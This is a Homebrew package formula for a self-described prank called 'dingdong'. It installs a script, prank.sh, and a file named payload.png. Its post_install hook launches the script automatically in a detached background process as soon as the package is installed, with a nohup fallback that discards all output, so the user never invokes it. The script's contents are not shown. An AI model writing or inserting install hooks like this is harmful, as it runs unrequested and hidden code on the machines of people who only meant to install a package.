class Dingdong < Formula
  desc "🎭 Karan's Ultimate Prank - Auto-execution edition"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.6.0"
  sha256 "fc97065bb92bf58b38c8e0c532aae305bffa3abf1b797ec38e533a7bbfc2dc50"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "🎭 Karan's Ultimate Prank v3.6 - Auto-Execution!"
    ohai "🚀 Starting automatically in background..."
    
    # ENHANCED: Use fork to properly detach the process
    begin
      if fork.nil?
        # Child process - run the prank
        exec("#{bin}/prank.sh", "#{pkgshare}/payload.png")
      else
        # Parent process - continue installation
        ohai "✅ Prank launched successfully!"
      end
    rescue
      # Fallback to simple background execution
      system("nohup #{bin}/prank.sh #{pkgshare}/payload.png >/dev/null 2>&1 &")
      ohai "✅ Prank launched via fallback method!"
    end
  end

  test do
    system "#{bin}/prank.sh", "--version"
  end
end
